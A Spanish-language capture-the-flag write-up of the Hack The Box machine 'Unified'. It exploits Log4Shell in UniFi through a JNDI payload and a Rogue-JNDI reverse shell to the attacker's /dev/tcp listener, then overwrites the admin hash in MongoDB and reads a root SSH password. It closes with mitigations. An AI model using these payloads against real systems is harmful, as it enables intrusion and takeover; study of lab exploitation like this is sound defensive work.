# Unified — HTB

**Plataforma:** Hack The Box
**Dificultad:** Fácil
**Categoría:** Web / UniFi / Log4Shell / RCE

---

## 1. 🔎 Reconocimiento

### Nmap

```bash
nmap -sCV --open -Pn 10.129.164.237
```

Encontramos:

* `22/tcp` → SSH
* `6789/tcp` → UniFi
* `8080/tcp` → HTTP
* `8443/tcp` → HTTPS

El puerto `8443` muestra una aplicación **UniFi Network**.

La versión identificada es:

```text
6.4.54
```

---

## 2. 📋 Enumeración

### Fuzzing web

```bash
ffuf -u https://10.129.164.237:8443/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Encontramos información del servidor:

```json
{
    "meta": {
        "rc": "ok"
    },
    "up": true,
    "server_version": "6.4.54",
    "uuid": "8918a2b4-6f90-4f13-8233-e29085bd16d7",
    "data": []
}
```

La versión `6.4.54` es importante porque es vulnerable a **Log4Shell — CVE-2021-44228**.

---

## 3. 💥 Explotación

### Log4Shell — CVE-2021-44228

La vulnerabilidad de Log4Shell permite conseguir **Remote Code Execution** mediante una cadena JNDI procesada por Log4j.

La explotación se realiza sobre:

```text
POST /api/login
```

Interceptamos la petición con **Burp Suite**.

En el JSON de la petición encontramos el parámetro:

```text
remember
```

El payload de prueba se introduce dentro de este parámetro:

```text
${jndi:ldap://<IP_TUN0>/whatever}
```

Como el cuerpo de la petición es JSON, el payload se introduce como una cadena para evitar que los caracteres `{}` sean interpretados como otro objeto JSON.

### Comprobación de la vulnerabilidad

Para comprobar si el servidor intenta realizar la conexión LDAP utilizamos:

```bash
sudo tcpdump -i tun0 port 389
```

El puerto `389` es el puerto estándar de LDAP.

Después enviamos la petición desde Burp.

Si recibimos tráfico en `tcpdump`, significa que el servidor UniFi está procesando el payload JNDI e intentando conectarse a nuestra máquina.

Por tanto, confirmamos que la aplicación es vulnerable a **Log4Shell**.

---

### Rogue-JNDI

Para pasar de la comprobación a una ejecución de comandos utilizamos **Rogue-JNDI**.

Clonamos el proyecto:

```bash
git clone https://github.com/veracode-research/rogue-jndi
```

Entramos en el directorio:

```bash
cd rogue-jndi
```

Y compilamos:

```bash
mvn package
```

Esto genera:

```text
target/RogueJndi-1.1.jar
```

Rogue-JNDI levanta un servidor LDAP controlado por nosotros y permite proporcionar el payload que será ejecutado por la máquina vulnerable.

---

### Reverse Shell

Creamos el payload de reverse shell y lo codificamos en Base64:

```bash
echo 'bash -c bash -i >&/dev/tcp/<IP_TUN0>/4444 0>&1' | base64
```

Después iniciamos Rogue-JNDI utilizando nuestro payload:

```bash
java -jar target/RogueJndi-1.1.jar \
--command "bash -c {echo,<BASE64>}|{base64,-d}|{bash,-i}" \
--hostname "<IP_TUN0>"
```

Rogue-JNDI queda preparado para recibir la conexión LDAP.

Nos ponemos a la escucha:

```bash
nc -lvp 4444
```

Volvemos a Burp Suite y modificamos el parámetro `remember`:

```text
${jndi:ldap://<IP_TUN0>:1389/o=tomcat}
```

Al enviar la petición:

```text
UniFi
  ↓
Log4j
  ↓
JNDI
  ↓
LDAP / Rogue-JNDI
  ↓
Payload
  ↓
Reverse Shell
  ↓
Nuestra máquina
```

Recibimos una shell en nuestro listener.

Podemos mejorarla con:

```bash
script /dev/null -c bash
```

La shell inicial nos permite acceder a:

```text
/home/Michael/
```

y obtener la **user flag**.

---

## 4. ⬆️ Escalada de privilegios

### Enumeración de MongoDB

Una vez dentro del sistema buscamos servicios internos.

Comprobamos si MongoDB está ejecutándose:

```bash
ps aux | grep mongo
```

Encontramos MongoDB escuchando en:

```text
27117
```

Este puerto es utilizado por UniFi para su instancia de MongoDB.

Podemos interactuar con ella:

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

La base de datos utilizada por UniFi es:

```text
ace
```

Encontramos el usuario:

```text
Administrator
```

y su información de autenticación.

---

### Modificar la contraseña de Administrator

La contraseña almacenada en:

```text
x_shadow
```

no resulta práctica para crackear.

En lugar de intentar crackearla, podemos **reemplazar el hash directamente en MongoDB** por uno generado por nosotros.

Generamos un hash SHA-512:

```bash
mkpasswd -m sha-512 Password1234
```

Obtenemos un hash con formato:

```text
$6$<salt>$<hash>
```

El `$6$` indica que se está utilizando SHA-512.

Ahora modificamos el documento del usuario `Administrator`:

```bash
mongo --port 27117 ace --eval \
'db.admin.update({"_id": ObjectId("<OBJECT_ID>")},{$set:{"x_shadow":"<SHA_512_HASH>"}})'
```

Comprobamos que el valor se haya actualizado:

```bash
mongo --port 27117 ace --eval \
"db.admin.find().forEach(printjson);"
```

Ahora conocemos la contraseña que corresponde al nuevo hash que hemos introducido.

---

### Acceso al panel administrativo de UniFi

Accedemos nuevamente a:

```text
https://10.129.164.237:8443
```

Utilizamos:

```text
Usuario: Administrator
Contraseña: Password1234
```

**Importante:** el nombre de usuario es sensible a mayúsculas/minúsculas.

Conseguimos acceder al panel administrativo de UniFi.

---

### Obtener la contraseña de root

Dentro del panel navegamos hasta:

```text
Settings → Site → SSH Authentication
```

UniFi permite configurar la autenticación SSH que utilizará para administrar los dispositivos.

Encontramos habilitada la autenticación SSH mediante contraseña para `root`.

La aplicación muestra la contraseña:

```text
NotACrackablePassword4U2022
```

Por tanto, tenemos las credenciales SSH de `root`.

---

### Acceso como root

Nos conectamos mediante SSH:

```bash
ssh root@10.129.164.237
```

Introducimos:

```text
NotACrackablePassword4U2022
```

Comprobamos:

```bash
whoami
```

Resultado:

```text
root
```

Finalmente encontramos la root flag en:

```text
/root
```

---

## 5. 📄 Reporte

### Resumen

La máquina **Unified** ejecuta **UniFi Network 6.4.54**, una versión vulnerable a **Log4Shell (CVE-2021-44228)**.

Durante la enumeración identificamos la versión y posteriormente comprobamos la vulnerabilidad utilizando una petición `POST /api/login` interceptada mediante Burp Suite. El parámetro vulnerable es `remember`.

Mediante un payload JNDI conseguimos provocar una conexión LDAP desde el servidor hacia nuestra máquina. Utilizando Rogue-JNDI conseguimos convertir esta interacción en **Remote Code Execution** y obtener una reverse shell.

Una vez dentro del sistema, descubrimos una instancia de MongoDB ejecutándose en el puerto `27117`. Accedimos a la base de datos `ace` y encontramos el usuario `Administrator`.

En lugar de crackear su hash `x_shadow`, lo sustituimos por un hash SHA-512 generado por nosotros. Esto nos permitió autenticarnos en el panel administrativo de UniFi.

Desde el panel encontramos la configuración de **SSH Authentication**, donde estaba expuesta la contraseña de `root`.

Finalmente utilizamos esas credenciales para conectarnos mediante SSH y obtener acceso como `root`.

### Cadena de ataque

```text
UniFi 6.4.54
      ↓
CVE-2021-44228 / Log4Shell
      ↓
JNDI
      ↓
LDAP / Rogue-JNDI
      ↓
Remote Code Execution
      ↓
Reverse Shell
      ↓
MongoDB :27117
      ↓
Base de datos ace
      ↓
Usuario Administrator
      ↓
Modificar x_shadow
      ↓
Acceso al panel UniFi
      ↓
SSH Authentication
      ↓
Contraseña de root
      ↓
SSH
      ↓
root
```

### Vulnerabilidades encontradas

| Vulnerabilidad                           | Severidad | Impacto                                |
| ---------------------------------------- | --------- | -------------------------------------- |
| Log4Shell — CVE-2021-44228               | Crítica   | Remote Code Execution                  |
| MongoDB accesible localmente             | Alta      | Acceso a información sensible de UniFi |
| Hash de Administrator modificable        | Crítica   | Compromiso de la cuenta administrativa |
| Contraseña SSH de root expuesta en UniFi | Crítica   | Acceso directo como root               |

### Mitigaciones

* Actualizar UniFi Network a una versión no vulnerable a CVE-2021-44228.
* Actualizar o eliminar las versiones vulnerables de Log4j.
* Restringir las conexiones LDAP/JNDI salientes desde el servidor.
* Proteger MongoDB mediante autenticación y controles de acceso.
* Impedir que usuarios no autorizados puedan modificar credenciales almacenadas.
* No mostrar contraseñas SSH en texto plano dentro del panel administrativo.
* No utilizar credenciales de `root` para administración remota cuando no sea estrictamente necesario.
* Aplicar el principio de mínimo privilegio.

---

## 🧠 Lessons Learned

* La **versión exacta** de un servicio es fundamental para identificar vulnerabilidades conocidas.
* Log4Shell puede convertir una entrada controlada por el atacante en una cadena de **JNDI → LDAP → RCE**.
* Burp Suite permite modificar peticiones antes de que lleguen al servidor.
* `tcpdump` permite comprobar conexiones LDAP sin necesidad de ejecutar todavía el exploit completo.
* Rogue-JNDI puede utilizarse para demostrar y explotar la interacción JNDI vulnerable.
* MongoDB es una base de datos **NoSQL** y utiliza documentos en formato similar a JSON.
* UniFi utiliza la base de datos `ace` para almacenar información de la aplicación.
* Cuando un hash no es viable de crackear, otra posibilidad es investigar si existe algún mecanismo que permita modificar el hash almacenado.
* `$6$` en un hash de `mkpasswd` identifica SHA-512.
* Conseguir acceso al panel administrativo puede revelar información que no estaba disponible desde la aplicación pública.
* Una mala configuración de SSH puede convertir una contraseña expuesta de `root` en acceso completo al sistema.
